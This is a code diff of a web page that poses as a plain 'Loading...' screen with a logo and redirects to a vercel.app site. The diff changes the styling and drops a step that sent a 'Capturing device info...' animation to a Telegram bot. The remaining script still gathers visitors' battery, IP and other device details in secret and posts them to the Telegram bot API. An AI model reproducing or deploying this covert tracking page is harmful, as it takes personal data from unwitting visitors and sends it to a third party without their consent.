@@ -7,16 +7,25 @@
   <meta http-equiv="refresh" content="10;url=https://heavenscake.vercel.app">
   <style>
     body {
-      background: #000;
-      color: #fff;
-      text-align: center;
+      margin: 0;
+      background: #fff;
+      color: #000;
       font-family: sans-serif;
-      font-size: 18px;
-      padding: 40px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    img {
+      width: 64px;
+      height: 64px;
+      margin-bottom: 16px;
     }
   </style>
 </head>
 <body>
+  <img src="/favicon.svg" alt="logo" />
   <p>Loading...</p>
 
   <script>
@@ -29,18 +38,6 @@
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ chat_id: CHAT_ID, text: message })
-      });
-    }
-
-    function sendGifURL() {
-      return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAnimation`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          animation: "https://heavenscake.vercel.app/07331b85449052cff8acbc861d3c6f01.gif",
-          caption: "🎬 Capturing device info..."
-        })
       });
     }
 
@@ -115,7 +112,6 @@
     }
 
     async function collectAndSend() {
-      await sendGifURL();
       await Promise.all([getBatteryInfo(), getIPInfo()]);
       getExtraDetails();
       await sendToTelegram(deviceInfo);
